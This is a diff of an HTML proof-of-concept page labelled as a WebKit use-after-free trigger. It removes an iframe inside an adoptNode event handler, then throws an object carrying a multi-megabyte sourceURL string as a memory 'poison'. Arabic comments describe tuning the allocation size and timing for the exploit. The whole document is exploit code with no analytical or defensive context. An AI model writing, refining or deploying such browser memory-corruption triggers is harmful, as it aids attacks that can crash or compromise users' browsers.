@@ -1,33 +1,27 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h3>WebKit UAF - Optimized Trigger</h3>
     <button onclick="main()">Click to trigger the bug</button>
-    <div id="status" style="font-family: monospace; color: #555;">Status: Ready...</div>
+    <div id="status">Status: Waiting...</div>
 
     <script>
         function main() {
-            document.getElementById('status').innerText = "Status: Triggering... (Do not click OK if prompted)";
+            document.getElementById('status').innerText = "Status: Triggering... (If browser freezes, wait 5s)";
             
             const f = document.body.appendChild(document.createElement('iframe'));
             const a = document.createElement('div');
             const b = a.appendChild(document.createElement('div'));
 
+            // دمج الـ poison مباشرة داخل الـ event handler بدون أي تأخير
             a.addEventListener('a', eval(`(function () {
                 document.adoptNode(a);
                 f.remove();
+                
+                let poison = 'A'.repeat(1024 * 1024 * 8); // 8MB مباشرة
 
-                // التعديل الجراحي: حجز 12 ميجابايت مع تأخير بسيط
-                setTimeout(() => {
-                    let poison = 'A'.repeat(1024 * 1024 * 3); // 3MB
-                    for(let i=0; i<2; i++) { poison += poison; } // زيادة لـ 12MB
-
-                    throw {
-                        line: 1,
-                        column: 1,
-                        sourceURL: poison
-                    };
-                }, 100); 
+                throw {
+                    sourceURL: poison
+                };
             })`));
 
             a.addEventListener('a', () => {});
